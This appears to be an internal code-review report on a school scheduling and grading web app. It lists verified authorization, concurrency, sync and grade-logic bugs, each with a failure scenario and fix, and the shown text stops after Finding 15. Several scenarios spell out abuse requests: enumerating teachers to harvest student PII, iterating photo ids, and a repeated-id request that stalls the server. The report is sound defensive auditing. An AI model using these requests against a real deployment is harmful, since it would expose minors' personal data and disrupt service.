# Code Review — Wechselplan (2026-08)

> Fresh full-codebase review of branch `claude/codebase-review-yiuar6` (HEAD `905e97c`), well ahead of the
> previous review in [`CODE_REVIEW_2026-07.md`](./CODE_REVIEW_2026-07.md). That review's 14 items are
> treated as fixed and were **not** re-reported; everything below was found on the current code and
> grounded in a `file:line` that was actually read.

## 0. Executive summary

Mechanically the repository is in good health. On this branch:

- **`tsc --noEmit`** — clean, 0 errors.
- **`eslint .`** — 0 errors (21 warnings: mostly `set-state-in-effect`, `<img>` vs `next/image`, a few
  unused vars / stale `eslint-disable` directives).
- **`vitest`** — 64 files, **564 tests, all passing**.

So `npm run check` (the primary gate) passes. The risks that remain are **logic and security**, not build
health. This review found **43 verified issues** (after an adversarial verification pass dropped 4 as
unfounded): **1 S1, 14 S2, 21 S3, 7 S4**.

The single most urgent item is an **S1 information-disclosure / horizontal-privilege bug**: `GET
/api/schedules/data` is guarded only at the `session` tier, takes an arbitrary `teacher` username, and returns
**full `Student` rows with no `select`** — including `matrikelnummer`, `sokratesId` (Entra `employeeId`),
`email`, `username`, `externalId` — to *any* signed-in user, **including a `student`**. Teacher usernames are
predictable (`firstname.lastname`), so one authenticated student can enumerate teachers and exfiltrate the
national student IDs and contact details of every minor in the school (Finding 1). This should be fixed before
anything else.

Beyond that, four themes account for most of the findings:

1. **`session`-tier endpoints trust caller-supplied identifiers and over-select.** The same pattern that
   produces the S1 recurs at lower severity in `/api/students/photo` (Finding 2), `/api/students/photo/check`
   (Finding 13, an event-loop DoS), and `/api/students/class` (Finding 16). The root cause is uniform:
   `session` tier authorises *any* logged-in user (students included), the handler reads an id/username from
   the query with no ownership scoping, and `findMany` runs without a `select`.

2. **The independent AM/PM-lane / per-weekday work (#98) left rotation queries unscoped.** Several endpoints
   read `teacherRotation` / `schedule` without filtering by `selectedWeekday` and/or `schoolYearId`, or rely
   on `orderBy: { createdAt: 'desc' }` "latest wins" — so a teacher's overview, grade auto-select, and the
   schedule-times editor can silently bind to the *wrong weekday's* plan (Findings 6, 7, 8, 22). These are
   correctness bugs that only appear once a class has more than one weekday plan.

3. **The Notenmanagement transfer path is not safe to retry.** There is no idempotency guard, so a
   double-submit or a network retry creates **duplicate LFs** in the external grade system (Findings 4, 12);
   any non-2xx `PUT` (500/403/429, not just 404) is treated as "LF was deleted" and a fresh LF is POSTed,
   orphaning a duplicate (Finding 27); and on any failure the teacher's **NM password and bearer token are
   written verbatim into the admin-visible error log** (Finding 11).

4. **The unattended nightly sync can mass-deactivate real people.** A transient Graph error on a single class
   group deactivates that whole class and its students (Finding 9), and teacher sync reads *direct* group
   membership while login reads *transitive*, so nested-group teachers get a staff session but are never
   synced — or get deactivated (Finding 10). The deactivation-threshold guard exists
   (`sync-guard.ts`) but is applied per-run, not per-group, and the sync module itself is **untested**
   (Findings 15, 34).

## 1. What is solid

This is a well-structured codebase and several of its hardest parts are done well — worth stating so the
findings are read in proportion:

- **Two-layer access enforcement driven by one table.** `api-access.ts` is the single source of truth,
  enforced at the edge (`middleware.ts`) *and* inside handlers (`api-guard.ts`), with unmatched routes
  defaulting to `staff`. The S1 above is a *mis-tiered rule plus over-select*, not a hole in the mechanism.
- **The `active-by-default` Prisma extension** (`prisma.ts`) is a clean solution to soft-delete filtering,
  with an explicit, documented opt-out (`ANY_ACTIVE_STATE`) and a unit-testable policy. Its one sharp edge —
  nested `include` reads bypass it — is documented, and only bites in two spots (Findings 38, and the
  isActive-on-nested-relation notes).
- **Notifications** store a `type` + `params` and render from the i18next catalogue, with a test that fails
  if a type has no message — a genuinely good design. The digest/dedup interaction has one real bug
  (Finding 25) but the architecture is sound.
- **Notenmanagement** funnels every server-side call through `server-client.ts` and attributes each grade
  write to the individual teacher — the right shape; the issues are in retry-safety and logging, not design.
- **Test health is real:** 564 passing tests including the Austrian grade rules, cadence, group distribution,
  and the Sokrates lock. The gaps (Findings 15, 33, 34, 37) are specific and closeable.

## 2. Methodology

Twelve review dimensions (authorization, grade computation, concurrency, schedule/rotation, directory sync,
notifications, Notenmanagement, crypto/secrets/env, PDF, input-validation, frontend, tests) were each reviewed
independently, then **every candidate finding was handed to a separate adversarial verifier** instructed to
*refute* it against the real code. Only `CONFIRMED` and `PLAUSIBLE` findings are listed; the 4 that were
`REFUTED` are recorded in §5 for transparency. The S1 and a sample of the high-severity S2s (Findings 5, 6,
11) were additionally re-checked by hand against the source.

Severity: **S1** exploitable / data-loss / privilege-escalation · **S2** functional bug · **S3** latent
risk / data-integrity / maintainability · **S4** minor / hardening.

## 3. Verified findings

Each finding: area, severity, verifier verdict, confidence, exact location, what/why, a concrete failure scenario, and a suggested fix.

### S1 — Exploitable / data-loss / privilege escalation

#### 1. GET /api/schedules/data returns full Student PII rows to any session (incl. students) for an arbitrary teacher

- **Area:** Authorization / Access · **Severity:** S1 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/schedules/data/route.ts:181`

**What & why.** The handler is guarded only at the `session` tier (`requireAccess('session')`, line 19) and takes an arbitrary `teacher` username query param. It looks the teacher up with `prisma.teacher.findUnique({ where: { username } })` (line 36) with NO check that the caller IS that teacher or is even staff — the self-only fallback at lines 47-52 only runs when the primary lookup FAILS, so any valid teacher username returns that teacher's data. It then loads the roster for every class the teacher teaches with `prisma.student.findMany({ where: { id: { in: ids }, isActive: true } })` (lines 181 and 184) with NO `select`, so every scalar Student column is serialized into the `students` array of the response (line 265). Per prisma/schema.prisma the Student model carries email, username, externalId, sokratesId (the Entra Graph employeeId), matrikelnummer (the national/NM student identifier) and nmKlasse. Because students authenticate via Entra with role `student` and `allowed:true` (src/lib/auth.ts:80-82) they satisfy the `session` tier (satisfiesTier: hasSession==true) at both the middleware and the handler. Every sibling grade route (all of src/app/api/noten/*) deliberately enforces a `teacherAssignment` 'Not assigned to this class' check and selects only {id,firstName,lastName,groupId,sitzplatz}; this route does neither, so it is a clear, inconsistent over-exposure.

**Failure scenario.** A logged-in student (or any authenticated user) issues GET /api/schedules/data?teacher=<any.teacher.username>&schoolYearId=<id>&weekday=3. The response's `students` array contains full Student records — matrikelnummer, sokratesId (Entra employeeId), email, username, externalId — for every student in that teacher's classes. Iterating over teacher usernames (predictable firstname.lastname; the caller already knows their own teachers) lets a single student exfiltrate the entire school's student PII, including national student IDs of minors.

**Suggested fix.** Require the `staff` tier for this endpoint (schedule/roster data is a teacher view) and, for defence in depth, verify the resolved teacher equals the caller (resolveSessionTeacher) unless the caller is admin. Independently, add an explicit `select` limiting Student to display fields (id, firstName, lastName, groupId, sitzplatz) as every noten/* and notensammler/class/[id] route already does, so PII columns are never serialized here.


### S2 — Functional bugs (wrong result, crash, broken feature)

#### 2. GET /api/students/photo streams any student's photo by enumerable id at session tier with no ownership check

- **Area:** Authorization / Access · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/students/photo/route.ts:27`

**What & why.** The route is guarded at `session` (denyUnlessAccess('session'), line 12) and gated only by the `student_photos` feature flag. It reads `studentId` straight from the query string and calls `resolveStudentPhoto(studentId)` (line 27) with no check that the caller is staff or that the photo belongs to the caller. Since students hold `session`-tier sessions (src/lib/auth.ts:80-82), any authenticated student can fetch any other student's photo by iterating the integer studentId (1..N). The app itself treats these photos as sensitive (feature-gated, `Cache-Control: private`), and the /api/me/photo route (src/app/api/me/photo/route.ts:27-31) shows the intended model: a student may only resolve their OWN photo. This bulk-by-id endpoint bypasses that.

**Failure scenario.** A signed-in student requests GET /api/students/photo?studentId=1, ?studentId=2, ... and downloads the face photo of every student in the school (all minors), regardless of class membership — a privacy breach of biometric-adjacent data to a peer.

**Suggested fix.** Restrict student-photo reads to the `staff` tier (teachers/admin, who legitimately see class photos), and route a student's own photo through /api/me/photo. If students must read photos of classmates, verify shared class membership for the caller before streaming.


#### 3. "Alle speichern" writes the class Endnote into the caller's teacher grade column, overwriting real marks and skewing averages

- **Area:** Grade computation · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** medium
- **Location:** `src/app/api/notensammler/final-grades/batch/route.ts:237`

**What & why.** The notensammler-page 'Alle speichern' (useGradeEditing.saveAllGrades) posts to /api/notensammler/final-grades/batch. After upserting FinalGrade, that route runs a second loop that mirrors every Endnote into the CALLER's own Grade column: `for (const fg of columnWritable) { if (fg.grade == null) continue; await tx.grade.upsert({ where: { studentId_teacherId_classId_semester_schoolYearId: { studentId: fg.studentId, teacherId: teacher.id, ... } }, update: { grade: fg.grade }, ... }) }` where `teacher = resolveSessionTeacher(session)` is whoever clicked save. The payload is built by getFinalGradeDisplay for EVERY student that has any grade or Endnote in the class (finalGradeStudentIds = union of grades and finalGrades keys in use-grade-editing.ts:366-390), not just students the caller teaches. The grid's own code states the opposite invariant: grade-table.tsx:301 'Endnote and Betragensnote belong to the class, not to a teacher column.' The single-cell Endnote route (src/app/api/notensammler/final-grades/route.ts, POST, lines 205-226) upserts ONLY FinalGrade and does NOT mirror, so identical logical edits produce different DB state depending on whether they were saved per-cell or via 'Alle speichern'. Because computeAverage (src/lib/grades.ts:100) averages across every teacher key present for a student, the caller's now-Endnote-filled column is folded into every student's displayed Durchschnitt (grade-table.tsx:295,313 and the PDF export in src/app/api/notensammler/pdf/route.ts).

**Failure scenario.** Teacher T teaches group 1 of class C and has entered subject mark 2 for student S (first semester); the conference set S's Endnote (FinalGrade) to 4. T opens the Notensammler grid and clicks 'Alle speichern'. grades/batch first re-saves T's mark 2 for S, then final-grades/batch mirrors Endnote 4 into T's Grade column for S (teacherId=T), overwriting the 2. On reload T's column shows 4, not 2 — the entered mark is lost. Additionally, Grade rows are created under T's id for every student in C that has an Endnote, including students in groups T never taught, so those students' computeAverage results (grid and PDF) now include T's mirrored Endnote column and shift toward the Endnote.

**Suggested fix.** Do not mirror the Endnote into the caller's Grade column. If the mirror exists only to enforce the Sokrates column lock, gate the write so it never creates/updates a Grade row for a (student,teacher) pair the caller does not actually own, or drop the mirror loop entirely and make the single-cell and batch routes consistent (both writing FinalGrade only). At minimum, restrict columnWritable to students the caller is the grading teacher for.


#### 4. Notenmanagement transfer has no lock/idempotency: concurrent or double-submitted transfers create duplicate LFs in the external grade system

- **Area:** Concurrency & data integrity · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/notensammler/transfer/route.ts:319`

**What & why.** The transfer loop does an unsynchronised read-then-external-write-then-persist: prisma.notenmanagementTransfer.findFirst (line 323) -> POST/PUT to the external NM /api/LFs (lines 334/338/347) -> prisma create/update (lines 342/350). There is no advisory lock, no $transaction, and no idempotency key on the external POST. Two requests for the same (classId, semester, schoolYearId) that overlap (a double-click, a client retry, or two teachers) both run findFirst before either commits, both see no existing transfer, and both POST a fresh LF, so two independent Leistungsfeststellungen for the same class/subject/semester land in the external Notenmanagement (Zeugnis-adjacent) system. For class-level transfers this also survives the DB: the unique index NotenmanagementTransfer_split_key (schema line 481) includes the nullable groupId, and for class transfers groupId is stored as NULL (isGroup=false). Postgres treats NULLs as distinct in a unique index, so both create() calls succeed, leaving two tracked transfer rows pointing at two different LFs; future PUTs update whichever findFirst returns, orphaning the other LF permanently.

**Failure scenario.** A teacher double-clicks 'Übertragen' for class 3AHIT, 1st semester (class-level, groupId=null). Request A: findFirst -> null -> POST /api/LFs creates LF #100. Request B (started ~50ms later, before A committed): findFirst -> null -> POST /api/LFs creates LF #200. Both create() succeed because (classId, NULL, 'first', yearId, '3AHIT') does not collide (NULL groupId). NM now shows the class's Endnoten filed under two LFs; the Klassenvorstand sees duplicate grade records that must be deleted by hand in the government system, and subsequent Wechselplan transfers only ever update one of them.

**Suggested fix.** Serialise the whole transfer for a (classId, groupId, semester, schoolYearId) key before touching NM — e.g. take a pg_advisory_xact_lock (as withSokratesLock does) or a row lock on the transfer record — so the second request blocks, re-reads, and does a PUT instead of a second POST. Additionally send an idempotency key to NM if the API supports it, and make the unique index NULLS NOT DISTINCT (or store groupId=0 for class-level) so duplicate class-level rows are rejected by the DB as a backstop.


#### 5. PATCH /api/noten/final-grades writes the Zeugnisnote with no Sokrates-lock check, bypassing the hard lock its sibling route enforces

- **Area:** Concurrency & data integrity · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/noten/final-grades/route.ts:149`

**What & why.** This route upserts FinalGrade rows (keyed studentId_classId_semester_schoolYearId — exactly the rows the Sokrates lock is meant to freeze) after only checking requireAccess('staff'), the 'noten' feature flag, and a teacherAssignment for the class. It never imports or calls getSokratesStatus / isFinalGradeEditBlocked / withSokratesLock (grep confirms zero references). Its sibling POST /api/notensammler/final-grades/batch protects the identical write with isFinalGradeEditBlocked under withSokratesLock (route.ts:198-262) precisely because a marked/locked semester must freeze the Zeugnisnote for everyone but the class lead/admin. When both the 'noten' and 'notensammler' features are enabled, this route is an unguarded parallel write path: any staff teacher assigned to the class can move a Sokrates-frozen final grade, and it also emits no SokratesChangeNotice, so the drift is silent.

**Failure scenario.** Class lead marks 3AHIT 2nd semester as entered into Sokrates (mark route sets lockedAll=true). Teacher X is assigned to 3AHIT but is not the lead and not admin. Via the Notensammler UI, X's edit of the Endnote is correctly skipped (skippedLocked). X instead sends PATCH /api/noten/final-grades {classId, semester:'second', finalGrades:[{studentId, grade:5}]}. The handler writes grade=5 into FinalGrade with no lock check and no notice. The Zeugnisnote now differs from what was typed into Sokrates, and the class lead is never told to re-sync — the exact drift the lock exists to prevent.

**Suggested fix.** Apply the same guard as the notensammler batch route: inside withSokratesLock(classId, schoolYearId, tx) read getSokratesStatus, drop entries where isFinalGradeEditBlocked(status, semester, canOverride) unless canManageSokrates, and record drift via recordSokratesChanges. Better, factor the locked-final-grade write into one shared helper both routes call so the two paths cannot diverge again.


#### 6. Grade auto-select resolves the rotation group without scoping teacherRotation to the current weekday or school year

- **Area:** Schedule & rotation · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/noten/auto-select/route.ts:158`

**What & why.** The Noten auto-select loads `prisma.teacherRotation.findMany({ where: { teacherId } })` (lines 126-128 and 158-160) with NO `selectedWeekday` and NO `schoolYearId` filter, then resolves the group with `rotations.find(r => r.classId === a.classId && r.period === period && r.turnId === currentTurnName && r.teacherId === teacher.id)` (lines 189-195; also 136-142). `TeacherRotation` is unique on `(classId, groupId, turnId, period, selectedWeekday, schoolYearId)` (schema.prisma:353), and turn labels ('TURNUS 1'…'TURNUS n') repeat across every weekday and every year, so this `.find()` matches the first stored row for that class/period/turn regardless of which weekday or year it belongs to. #98 explicitly lets one class hold an independent rotation on each weekday, so distinct rotations legitimately share the same turn names.

**Failure scenario.** Teacher X teaches class 1A AM on Monday (TURNUS 2 -> group 1) and on Thursday (TURNUS 2 -> group 3). On a Monday, the Noten page calls auto-select with currentWeekday=1; `rotations.find` ignores selectedWeekday and returns the Thursday row (group 3). The guard `assignments.some(as => as.classId === rot.classId && as.groupId === rot.groupId)` passes because X really is assigned to group 3 on Thursday. The teacher is silently defaulted into group 3 and enters Monday's grades against the wrong group. Prior-year rotation rows (never deleted; the rotation route only deletes the current year) can match the same way.

**Suggested fix.** Filter the rotation query by `schoolYearId` and add `r.selectedWeekday === a.selectedWeekday` (currentWeekday) to every `rotations.find(...)` predicate here. The same fix is needed in the sibling read paths that share this pattern: src/app/api/noten/search/route.ts:123 and src/app/api/export/notenliste/route.ts:336.


#### 7. Schedule-times GET/POST read and overwrite the wrong weekday's plan (latest-created schedule wins)

- **Area:** Schedule & rotation · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/schedules/times/route.ts:85`

**What & why.** Both GET (lines 48-59) and POST (lines 85-96) select the schedule with `prisma.schedule.findFirst({ where: { classId }, orderBy: { createdAt: 'desc' } })` — keyed only on classId, ignoring `selectedWeekday` and `schoolYearId`. The client (use-schedule-times.ts and schedule-times-selector.tsx) only ever sends `classId`. Since #98 a class has one Schedule row per weekday (and per year), so `findFirst … createdAt desc` returns whichever weekday's plan happened to be created most recently, and the POST then does `scheduleTimes: { set: ... }` / `breakTimes: { set: ... }` on that wrong schedule.

**Failure scenario.** Class 1A has a Monday plan (created first) and a Thursday plan (created later). A teacher opens the times step for the Monday plan and saves period/break times. POST /api/schedules/times resolves the Thursday schedule (newest createdAt) and overwrites Thursday's times via `set`, while Monday's times are never touched. The user's Monday edit appears lost and Thursday's times silently change. GET has the mirror bug: the times step for Monday displays Thursday's saved times.

**Suggested fix.** Thread `selectedWeekday` (and `schoolYearId`) through the times request body and the fetch query, and add them to both `findFirst` where-clauses so times are read/written on the schedule actually being edited.


#### 8. schedules/data returns teacherRotation unfiltered by weekday/year; teacher overview matches the wrong weekday's row

- **Area:** Schedule & rotation · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/schedules/data/route.ts:74`

**What & why.** The teacher schedule view fetches `prisma.teacherRotation.findMany({ where: { teacherId: teacher.id } })` (lines 74-78) with no `selectedWeekday` and no `schoolYearId` filter, even though the endpoint is invoked per weekday (weekdayNum) and already scopes `schedules` and `assignments` to that weekday+year. The whole set of rotation rows across every weekday and year is handed to the client. The consumer components/overviews/teacher.tsx:219-225 then does `scheduleData.teacherRotation.find(r => Number(r.teacherId)===... && r.classId===... && r.period===... && r.turnId===turnName)` — matching on the turn *name*, which collides across weekdays.

**Failure scenario.** Teacher X teaches 1A AM on Monday (TURNUS 1 -> group 1) and Thursday (TURNUS 1 -> group 2). Viewing the Monday overview, `teacherRotation` contains both rows; `.find()` returns whichever the DB yields first (e.g. the Thursday group-2 row), so the Monday overview shows X teaching group 2 instead of group 1 for the current turn. Same collision occurs across school years since old rotation rows are never purged.

**Suggested fix.** Scope the query to `{ teacherId, selectedWeekday: weekdayNum, ...(schoolYearId != null ? { schoolYearId } : {}) }`, and/or include selectedWeekday+schoolYearId in the overview's `.find()` predicate.


#### 9. A transient Graph error on one class group deactivates that class and all its students on the unattended nightly sync

- **Area:** Directory sync & Entra · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/lib/class-student-sync.ts:612`

**What & why.** previewClassStudentSync fetches each configured class group with getGroup() then collectGroupMembers(). When either call fails, the group is pushed onto unresolvedGroupIds / issues and the loop `continue`s (lines 362-374 for getGroup, 390-402 for collectGroupMembers). graphFetch only retries HTTP 429, not 5xx or network errors (src/lib/graph.ts:126-148), so a single transient 500/503/timeout on one group throws and is caught here. Crucially, unresolvedGroupIds is only echoed back in the diff (lines 700-702) and is NEVER consulted when computing deactivations: the class-deactivation loop (483-488) and the student-deactivation loop (612-617) simply retire every active entra-sourced row that is not in matchedClassIds/matchedStudentIds. Because the failed group's members were never collected, its local Class row and every Student in it fall straight into toDeactivate. The only thing standing in the way is the coarse per-scope mass-deactivation ratio guard (sync-guard.ts, default 0.2), which is designed for the catastrophic 'everyone left' case and does not isolate a single failed group. A transient error is thus indistinguishable from a legitimate group deletion (getGroup 404 also returns null -> same path), and both deactivate.

**Failure scenario.** A school syncs 20 class groups (~400 students) nightly via the shared-secret /api/sync/run path with no human reviewing the preview. One night Graph returns 503 for a single group's getGroup() call. That group (5% of classes) and its ~20 students (~5% of students) are unmatched; both ratios are under the 0.2 guard, so the run applies: the class and all 20 students get isActive:false. Until the next successful sync (up to 24h) those students vanish from active rosters, schedule views, and Notensammler grade sheets; if the morning grade transfer to Notenmanagement runs in that window it silently omits them (the transfer query filters where isActive:true, src/app/api/notensammler/transfer/route.ts:133).

**Suggested fix.** Treat a group that failed to resolve differently from one legitimately deleted: when unresolvedGroupIds is non-empty, either abort the whole run (the diff is untrustworthy) or exclude the local Class rows mapped to those group ids AND their students from the deactivation candidates. getGroup already distinguishes 404 (returns null) from a thrown transient error, so only the null case should feed deactivation; a thrown error should hold back the corresponding class+students.


#### 10. Teacher sync reads DIRECT group members while login reads TRANSITIVE membership, so nested-group teachers get staff login but are never synced (or are deactivated)

- **Area:** Directory sync & Entra · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/lib/teacher-sync.ts:120`

**What & why.** previewTeacherSync calls collectGroupMembers(teacherGroupId) with no options, which hits /groups/{id}/members (direct members only, src/lib/graph.ts:215). The login path resolveMicrosoftAccess() instead calls checkMemberGroups() (auth.ts:73), which is transitive (graph.ts:340-345, /users/{oid}/checkMemberGroups), and class-student sync also uses transitive:true (class-student-sync.ts:389). The login code's own doc comment (graph.ts:344-347, auth.ts:33) justifies transitivity precisely so 'nested class groups resolve the same way class sync sees them' -- but teacher sync was left non-transitive, so login and teacher sync disagree for any teacher who belongs to the teacher group only through a nested sub-group.

**Failure scenario.** The teacher group ENTRA_TEACHER_GROUP_ID contains a nested sub-group holding some staff. Teacher A is a member only via that sub-group. At login, checkMemberGroups returns the teacher group transitively -> role 'teacher' (staff access granted). But previewTeacherSync's direct-member listing never includes A, so A is never created -> resolveSessionTeacher finds no Teacher row and every class list / Notensammler view renders empty. Worse: if A was previously a direct member (created by sync) and is then moved into the sub-group, the next nightly sync sees A missing from the direct list and pushes A onto toDeactivate (teacher-sync.ts:277-282), deactivating a still-valid, still-logged-in staff member and removing them from active teacher pickers and assignment views.

**Suggested fix.** Pass { transitive: true } to collectGroupMembers in previewTeacherSync so the teacher roster matches the transitive membership login grants, exactly as class sync already does.


#### 11. Teacher's Notenmanagement password and bearer token are persisted in plaintext to the admin-visible error log on any transfer failure

- **Area:** Notenmanagement integration · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/notensammler/transfer/route.ts:371`

**What & why.** The transfer handler assigns the entire parsed request body to `requestData` at line 89 (`requestData = body`). That body includes the teacher's NM credentials — `password` (line 106) and/or `token` (line 107). In the catch block (line 368-372) it passes `extra: { requestData }` to `captureError`, which forwards to `recordError` → `redactContext`. But `redactContext` (src/lib/error-log.ts:66-83) only walks the TOP-LEVEL keys with a single `Object.entries(context)` loop and checks each key name against `REDACT_KEYS` ('password','token',...). Here the only top-level key is `requestData`, which is NOT in the set; its value is an object (not a string >500 chars) so it is stored verbatim. The nested `requestData.password` and `requestData.token` are therefore never redacted and land in `ErrorLog.context`, which admins read in plaintext under Admin → Fehlerprotokoll. The `captureError` doc comment explicitly forbids this ('never raw request bodies'). The same anti-pattern leaks student grades in src/app/api/noten/final-grades/route.ts:193 (`extra: { requestData }` where requestData carries `finalGrades`).

**Failure scenario.** A teacher opens the transfer dialog and mistypes their Notenmanagement password. `getNmToken(nmUsername, password)` (line 255) throws `NmAuthError`; the catch at line 366 runs `captureError(error, { ..., extra: { requestData } })` with `requestData.password` = the plaintext password they just typed. An ErrorLog row is written whose `context.requestData.password` holds that cleartext credential, now readable by every admin in the in-app error log (and by anyone with DB access). Any NM 5xx or a Prisma error during the transfer triggers the same leak of the password and/or live bearer token.

**Suggested fix.** Never pass the raw body. Build a sanitized `extra` with only non-secret identifiers (e.g. `{ classId, groupId, semester, schoolYearId }`) and drop `password`/`token`/`notes` entirely. Optionally make `redactContext` recurse into nested objects/arrays and redact by key at any depth, and apply the same fix to noten/final-grades (which leaks grades).


#### 12. Class-flow transfers have no DB-level idempotency guard (NULL groupId defeats the unique index) — concurrent/retried transfers create duplicate LFs in Notenmanagement

- **Area:** Notenmanagement integration · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/notensammler/transfer/route.ts:350`

**What & why.** Idempotency for a re-transfer relies on `notenmanagementTransfer.findFirst(...)` (line 323) → PUT existing / else POST+create (line 347-352). For the class flow `groupId` is null (`isGroup = groupId !== null`, line 92) and `nmKlasse`/`klasse` is always non-null (falls back to `classRecord.name`, line 219-220). The backing constraint `@@unique([classId, groupId, semester, schoolYearId, nmKlasse])` (schema line 481) does NOT enforce uniqueness for these rows because PostgreSQL treats NULLs as distinct in a unique index — any row with `groupId = NULL` is exempt. So the class flow is guarded only by a TOCTOU `findFirst`→`create`, with a wide race window (NM calls have a 20s timeout at line 22). Two concurrent requests each see no existing row, each POST a brand-new LF to the external gradebook, and both `create` succeed (constraint bypassed), yielding duplicate LFs AND duplicate local transfer rows. The group flow is safe because both groupId and nmKlasse are non-null.

**Failure scenario.** A teacher double-clicks 'Übertragen' for a class (or the first request is retried on a slow network). Request A: findFirst → none → POST /api/LFs creates LF #5001 → create transfer row. Request B (concurrent, ran findFirst before A committed): none → POST creates LF #5002 → create succeeds (groupId NULL, no unique collision). The external Notenmanagement now holds two LFs (#5001, #5002) with the same semester grades for the class; students appear twice. A later re-transfer's `findFirst` returns only one of the two rows, so the other LF is never updated and drifts.

**Suggested fix.** Serialize the read-modify-write per key (e.g. a Postgres advisory lock on a hash of classId+groupId+semester+schoolYearId+nmKlasse, or a `SELECT ... FOR UPDATE` on a dedicated lock row) before the findFirst/POST, so only one LF is created. Migrating the unique index to `NULLS NOT DISTINCT` (PG15+) or using a sentinel groupId (e.g. 0) for the class flow would also let the DB reject the duplicate `create` — but the LF is already POSTed by then, so the lock is the real fix.


#### 13. Unbounded ids param in /api/students/photo/check blocks the event loop (session-tier DoS)

- **Area:** Input validation & imports · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/students/photo/check/route.ts:50`

**What & why.** The GET handler splits the `ids` query param on commas, parses each to an int, and loops over every entry with no cap and no de-duplication. In the default path each id calls hasPhotoForStudent() (line 11-22), which does up to three SYNCHRONOUS fs.existsSync() calls; with effective=true each id instead calls hasEffectiveStudentPhoto -> resolveStudentPhoto, which issues two UNCACHED sequential DB queries (getDirectorySyncSettings -> directorySyncSettings.findUnique, plus student.findUnique). The route is only 'session' tier, so any signed-in student can call it.

**Failure scenario.** A student sends GET /api/students/photo/check?ids=7,7,7,7,... with a single valid id repeated ~8000 times (fits inside Node's ~16KB header/URL budget). Because there is no cap or Set-dedupe, the handler runs hasPhotoForStudent 8000 times => up to 24000 synchronous fs.existsSync() calls executed in one request, blocking the Node event loop for the whole process so every other user's request stalls. Adding &effective=true instead fans out to ~16000 sequential DB round-trips per request. A handful of concurrent requests takes the app down.

**Suggested fix.** Cap the number of ids (e.g. reject or slice > 200), de-duplicate via new Set(), replace fs.existsSync with async fs.promises.access, and batch the effective lookups (single prisma.student.findMany with id in [...] + one settings read) instead of per-id sequential queries.


#### 14. useScheduleOverview has no request cancellation or token guard: a slow class switch shows another class's schedule

- **Area:** Frontend / React · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/hooks/use-schedule-overview.ts:257`

**What & why.** The main data-loading effect (lines 93-258) fires a long sequence of fetches (students, group assignments, times, rotation, teacher assignments, class data) and writes each into state via setGroups/setAmTurns/etc. Unlike every sibling data hook in this codebase (use-current-teacher, use-notensammler-data, use-sokrates, use-sokrates-changes all use an AbortController or a monotonic loadToken), this effect returns NO cleanup and carries no token: `void fetchData()` at line 257 with deps [classId, resolvedClassId, yearQ, weekdayFilter]. Two defects follow. (1) Last-resolved-wins race: switching class while a fetch is in flight lets the older, slower response overwrite the newer one. (2) Transient id mismatch: `classId` here is the class NAME (schedules/page.tsx passes searchParams.get('class')). When the name changes, the sibling effect that resolves name->resolvedClassId (lines 68-89) has not yet updated `resolvedClassId`, so this effect runs once with the NEW name (line 104 fetches `/api/students?class=${classId}` = new class) but the OLD numeric `resolvedClassId` (line 111 fetches `/api/schedules/assignments?classId=${resolvedClassId}` = previous class), rendering one class's students against another class's group assignments until the second pass corrects it.

**Failure scenario.** On /schedules a teacher clicks class A (slow network), then quickly clicks class B. router.push only changes the ?class= param, so the hook instance persists. A's six fetches resolve after B's; the setState calls for A run last and the overview renders A's groups, turnus columns, and AM/PM teacher assignments while the page header and export state say B. Because there is no abort, nothing stops the stale writes. Separately, in the single-class case the first render after the switch fetches B's students but A's group assignments, briefly grouping B's roster into A's group structure (students silently dropped where ids don't match).

**Suggested fix.** Add an AbortController (or a monotonic token ref like use-notensammler-data) to the effect, pass its signal to every fetch, return a cleanup that aborts/invalidates, and gate all setState on the request still being current. Also gate the fetch on `resolvedClassId` matching the current `classId` (or key the whole hook on the resolved numeric id) so students and assignments are never fetched for two different classes in the same pass.


#### 15. The /api/sync/run shared-secret gate has zero test coverage (its identical twin is fully tested)

- **Area:** Test coverage · **Severity:** S2 · **Verdict:** CONFIRMED · **Confidence:** high
- **Location:** `src/app/api/sync/run/route.ts:49`

**What & why.** /api/sync/run is declared 'public' in API_ACCESS_RULES (src/lib/api-access.ts:76) and is EXEMPT from the route-guards regression test (route-guards.test.ts:21). Middleware performs no session check for it, and vitest.setup.ts globally mocks @/lib/api-guard to 'allowed'. The sole thing standing between the open internet and runFullDirectorySync (which mass-creates/deactivates Teacher and Student rows, i.e. grants and revokes application access) is the handler-local isAuthorized() secret check. No test anywhere imports this route or runFullDirectorySync (confirmed by grep: only route-guards.test.ts references it, and only to skip it). Its byte-for-byte twin at src/app/api/notifications/digest/run/route.ts:51 has a dedicated route.test.ts covering 503-when-unset, 401-on-wrong-secret, and bearer acceptance — but isAuthorized is copy-pasted independently into each file (no shared helper), so the digest test exercises a different copy and cannot catch a regression here.

**Failure scenario.** A developer 'simplifies' sync/run's isAuthorized — e.g. drops the `a.length === b.length &&` guard (making timingSafeEqual throw and the outer code treat it as… nothing, since there is no try/catch around it), inverts `!isAuthorized`, or changes the unset-secret branch to fall through. The change compiles, `npm run check` passes, and the full test suite stays green because no test drives this handler. The nightly-sync trigger ships either permanently broken (silent: 'nightly_only' means never syncs) or open to unauthenticated POSTs that can deactivate every teacher/student.

